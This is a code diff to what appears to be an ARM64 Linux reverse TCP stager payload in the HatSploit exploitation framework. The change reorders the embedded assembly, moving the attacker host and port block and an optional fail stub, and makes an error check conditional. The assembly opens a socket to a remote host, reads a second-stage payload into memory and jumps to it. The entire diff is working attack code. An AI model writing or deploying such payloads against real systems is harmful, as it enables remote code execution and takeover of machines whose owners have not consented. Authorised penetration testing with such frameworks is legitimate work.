@@ -29,7 +29,24 @@ class HatSploitPayload(Payload, Handler):
                                     False, advanced=True)
 
     def run(self):
-        assembly = """
+        assembly = f"""
+        bl start
+
+        addr:
+            .short 0x2
+            .short 0x{self.rport.little.hex()}
+            .word 0x{self.rhost.little.hex()}
+        """
+
+        if self.reliable.value:
+            assembly += """
+            fail:
+                mov x0, 1
+                mov x8, 0x5d
+                svc 0
+            """
+
+        assembly += """
         start:
             mov x0, 0x2
             mov x1, 0x1
@@ -112,8 +129,14 @@ class HatSploitPayload(Payload, Handler):
             mov x2, x4
             mov x8, 0x3f
             svc 0
+        """
 
-            cbz w0, fail
+        if self.reliable.value:
+            assembly += """
+                cbz w0, fail
+            """
+
+        assembly += """
             add x3, x3, x0
             subs x4, x4, x0
             bne loop
@@ -128,21 +151,6 @@ class HatSploitPayload(Payload, Handler):
         assembly += """
             ldr x0, [sp]
             blr x0
-        """
-
-        if self.reliable.value:
-            assembly += """
-            fail:
-                mov x0, 1
-                mov x8, 0x5d
-                svc 0
-            """
-
-        assembly += f"""
-        addr:
-            .short 0x2
-            .short 0x{self.rport.little.hex()}
-            .word 0x{self.rhost.little.hex()}
         """
 
         return self.__asm__(assembly)
